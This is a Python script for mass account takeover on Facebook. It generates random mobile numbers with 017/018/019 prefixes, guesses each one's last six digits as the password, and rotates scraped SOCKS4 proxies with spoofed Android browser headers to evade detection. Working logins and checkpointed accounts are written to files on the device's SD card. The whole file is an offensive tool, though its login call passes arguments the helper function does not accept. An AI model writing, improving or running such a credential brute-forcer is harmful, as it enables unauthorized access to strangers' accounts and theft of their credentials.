import requests
import random
import sys
import os
import re

def get_proxies():
    try:
        response = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all')
        response.raise_for_status()  # Raise an exception if the request was not successful (status code >= 400)
        proxies = response.text.splitlines()
        with open('.prox.txt', 'w') as file:
            file.write('\n'.join(proxies))
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        try:
            with open('.prox.txt', 'r') as file:
                proxies = file.read().splitlines()
        except FileNotFoundError:
            proxies = []
    return proxies

def make_request_with_proxy(url, proxies=None):
    try:
        response = requests.get(url, proxies=proxies)
        response.raise_for_status()  # Raise an exception if the request was not successful (status code >= 400)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None

os.system("clear")

proxies = get_proxies()
if not proxies:
    print("No proxies available.")
    sys.exit()

current_proxy = 0

for i in range(6000):
    code = ["017","018","019"]
    code2 = random.choice(code)
    final_code = str(code2)
    x = random.randint(11, 99)
    xx = str(x)
    first_part = (final_code + xx)
    lest = random.randint(111111, 999999)
    last_part = str(lest)
    num = (first_part + last_part)
    pwd = (last_part)

    if current_proxy >= len(proxies):
        current_proxy = 0
    proxy = {'http': proxies[current_proxy], 'https': proxies[current_proxy]}
    current_proxy += 1

    session = requests.Session()
    free_fb = make_request_with_proxy('https://mbasic.facebook.com', proxies=proxy)

    log_data = {
        "try_number": "0",
        "unrecognized_tries": "0",
        "email": num,
        "pass": pwd,
        "login": "Log In"
    }

    lsd_match = re.search('name="lsd" value="(.*?)"', str(free_fb))
    if lsd_match:
        log_data["lsd"] = lsd_match.group(1)
    else:
        print("Unable to extract 'lsd' value.")
        continue

    header_freefb = {
        'authority': 'mbasic.facebook.com',
        "method": 'GET',
        "scheme": 'https',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
        'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5655.225", "Google Chrome";v="113.0.5655.225"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '""',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5655.225 Mobile Safari/537.36',
        'viewport-width': '980',
    }

    lo = make_request_with_proxy('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8', data=log_data, headers=header_freefb, proxies=proxy)
    log_cookies = session.cookies.get_dict().keys()
    if "c_user" in log_cookies:
        print("[✓]"+num+"="+pwd)
        save = open("/sdcard/[OK].txt","a").write(num+"="+pwd+"\n")
    elif "checkpoint" in log_cookies:
        print("[×]"+num+"="+pwd)
        saver = open("/sdcard/[CP].txt","a").write(num+"="+pwd+"\n")
    else:
        print(f"[Trying]-{[i]}")
